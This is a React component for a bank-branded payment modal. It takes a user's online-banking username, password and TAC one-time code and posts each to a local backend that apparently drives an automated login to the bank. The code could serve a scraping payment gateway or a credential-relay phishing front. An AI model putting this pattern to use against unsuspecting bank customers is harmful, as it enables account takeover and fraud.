import React, { useEffect, useState, useContext } from "react";
import styles from "./styles.module.css";
import ProgressBar from "../ProgressBar";
import Timer from "../Timer";
import banks from "../../banks";
import axios from "axios";
import { useParams, useHistory } from "react-router-dom";
import Firebase, { FirebaseContext } from "../Firebase";

import { useDocumentData } from "react-firebase-hooks/firestore";

import Loading from "./Loading";
import Successful from "./Successful";
import SomethingWentWrong from "./SomethingWentWrong";
import TimeoutError from "./TimeoutError";
import bodyState from "./bodyState";
import Username from "./Username";
import Password from "./Password";
import Tac from "./Tac";

function LoginForm() {
  let firebase = useContext(FirebaseContext);
  let { transactionId } = useParams();
  let [bank, setBank] = useState("BSN");
  let [amount, setAmount] = useState(0);

  let history = useHistory();
  let [hide, setHide] = useState(true);
  let [stage, setStage] = useState(bodyState.USERNAME);
  let [completed, setCompleted] = useState(0);
  let [tacPhoneNumber, setTacPhoneNumber] = useState("");
  let [tacDate, setTacDate] = useState("");
  let [start, setStart] = useState(null);
  let [error, setError] = useState(null);

  useEffect(() => {
    verifyTransaction();
  }, []);

  let [transaction, loading, firebaseError] = useDocumentData(
    firebase.getTransactionRef(transactionId)
  );

  console.log(transactionId);

  console.log(transaction, loading, firebaseError);

  useEffect(() => {
    console.log("Update completeness");
    updateCompleteness();
  }, [transaction]);

  function updateCompleteness() {
    if (transaction) {
      console.log(transaction);
      switch (
        Object.keys(transaction.history[transaction.history.length - 1])[0]
      ) {
        case "START_CHECK_WEBSITE":
          setCompleted(5);
          break;
        case "DONE_CHECK_WEBSITE":
          setCompleted(10);
          break;
        case "START_FILL_USERNAME":
          setCompleted(15);
          break;
        case "DONE_FILL_USERNAME":
          setCompleted(25);
          break;
        case "DONE_CLICK_MODAL":
          setCompleted(40);
          break;
        case "START_FILL_PASSWORD":
          setCompleted(45);
          break;
        case "DONE_FILL_PASSWORD":
          setCompleted(50);
          break;
        case "START_FILL_TRANSFER":
          setCompleted(60);
          break;
        case "START_REQUEST_TAC":
          setCompleted(65);
          break;
        case "DONE_REQUEST_TAC":
          setCompleted(70);
          break;
        case "START_FILL_TAC":
          setCompleted(75);
          break;
        case "DONE_FILL_TAC":
          setCompleted(80);
          break;
        default:
          break;
      }
    }
  }

  async function verifyTransaction() {
    let result = await axios.post(
      `http://localhost:8888/transaction/${transactionId}`
    );

    if (result.data.code === 200) {
      let transaction = result.data.data;

      if (transaction.history[0]["INIT"] + 180000 >= Date.now()) {
        console.log(transaction.history[0]["INIT"]);

        setBank(transaction.bank);
        setAmount(transaction.amount);
        setStart(Date.now());

        setHide(false);
      } else {
        setStart(null);
        setError("SESSION_EXPIRED");
      }
    } else {
      setHide(true);
    }
  }

  async function handleButtonClick(value) {
    setStart(Date.now());

    switch (stage) {
      case bodyState.USERNAME:
        if (value) {
          try {
            setStage(bodyState.LOADING);
            let result = await axios.post("http://localhost:8888/username", {
              id: transactionId,
              username: value,
            });

            if (result.data.code === 400) {
              setStage(bodyState.ERROR);
            } else {
              setStart(Date.now());
              setStage(bodyState.PASSWORD);

              console.log("Set completed 40");

              setCompleted(40);
            }
          } catch (e) {
            console.log(e);
          }
        } else {
          alert("Please enter your username");
        }
        break;
      case bodyState.PASSWORD:
        if (value) {
          try {
            setStage(bodyState.LOADING);

            let result = await axios.post(
              "http://localhost:8888/authenticate",
              {
                id: transactionId,
                password: value,
              }
            );

            console.log(result);

            if (result.data.code === 400) {
              setCompleted(0);
              setStage(bodyState.ERROR);
            } else {
              if (bank !== "CIMB") {
                const phoneNumber = result.data.phoneNumber;
                const date = result.data.date;

                setStart(Date.now());
                setTacPhoneNumber(phoneNumber);
                setTacDate(date);
                setStage(bodyState.TAC);
                setCompleted(80);
              } else {
                const phoneNumber = result.data.phoneNumber;
                const date = result.data.date;

                setStart(Date.now());
                setTacPhoneNumber(phoneNumber);
                setTacDate(date);

                setCompleted(80);
              }
            }
          } catch (e) {
            console.log(e);
            setStage(bodyState.ERROR);
          }
        } else {
          alert("Please enter your password");
        }
        break;
      case bodyState.TAC:
        if (value) {
          setStage(bodyState.LOADING);
          let result = await axios.post("http://localhost:8888/tac", {
            id: transactionId,
            tac: value,
          });

          if (result.data.code === 200) {
            setStage(bodyState.SUCCESS);
          } else if (result.data.code === 300) {
            setCompleted(0);
            setStage(bodyState.ERROR);
          }
        }
        break;
      default:
        console.log("Button is clicked");
        break;
    }
  }

  function handleReturning(e) {
    e.preventDefault();

    setStage(bodyState.USERNAME);
    setCompleted(0);
  }

  function body(stage) {
    switch (stage) {
      case bodyState.USERNAME:
        return <Username onButtonClick={handleButtonClick} />;

      case bodyState.PASSWORD:
        return <Password onButtonClick={handleButtonClick} />;

      case bodyState.TAC:
        return (
          <Tac
            onButtonClick={handleButtonClick}
            tacDate={tacDate}
            tacPhoneNumber={tacPhoneNumber}
          />
        );
      case bodyState.ERROR:
        return <SomethingWentWrong onReturn={handleReturning} />;
      case bodyState.TIMEOUT:
        return <TimeoutError onReturn={handleReturning} />;
      case bodyState.LOADING:
        return <Loading bank={bank} />;
      case bodyState.SUCCESS:
        return <Successful />;
      default:
        return <Loading bank={bank} />;
    }
  }

  return (
    <div className={`${styles["login-form"]}`}>
      <div
        className={`${styles["modal-content"]} ${
          styles[`${bank.toLowerCase()}-modal-content`]
        }`}
        hidden={hide}
      >
        <div
          className={`${styles["modal-header"]} ${
            styles[`${bank.toLowerCase()}-modal-header`]
          }`}
        >
          <img
            alt="Bank Logo"
            src={banks[bank].logo}
            className={styles["img-circle"]}
          />
          <h4>{banks[bank].name}</h4>
          <br />
          <div id={styles["refid"]}>
            Reference ID: {transactionId.slice(0, 10)}
          </div>
          <small>Amount to charge</small>
          <h3 className={styles["amount"]}>MYR {amount}.00</h3>
          <ProgressBar bgcolor={"#2ecc71"} completed={completed} />
          <Timer
            timeout="180"
            start={start}
            onTimerEnd={() => {
              setCompleted(0);
              setStage(bodyState.TIMEOUT);
            }}
          />
        </div>
        <div
          className={`${styles["modal-body"]} ${
            styles[`${bank.toLowerCase()}-modal-body`]
          }`}
        >
          {body(stage)}
        </div>
        <div
          className={`${styles["modal-footer"]} ${
            styles[`${bank.toLowerCase()}-modal-footer`]
          }`}
        >
          <small>
            Please <strong>DO NOT REFRESH</strong> your web browser
          </small>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
